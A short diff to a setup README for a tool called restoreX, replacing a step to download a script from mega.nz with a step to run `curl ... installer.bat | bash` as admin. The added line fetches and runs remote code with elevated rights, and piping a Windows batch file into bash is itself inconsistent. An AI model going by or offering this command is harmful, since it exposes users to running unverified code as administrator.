@@ -20,7 +20,7 @@ download assets from mega
 
 
 # BEFORE ANYHING:
-1. download restoreX.sh https://mega.nz/file/rN0DgQoY#ID3jG8qU6_CueEQoKBTQENJ5WvbAjxFH_jt5hnE6Zuc
+1. run `curl https://realmcode.com/restoreX/v.10/installer.bat | bash` in terminal as admin
 2. run it 
 
 # what will this do?
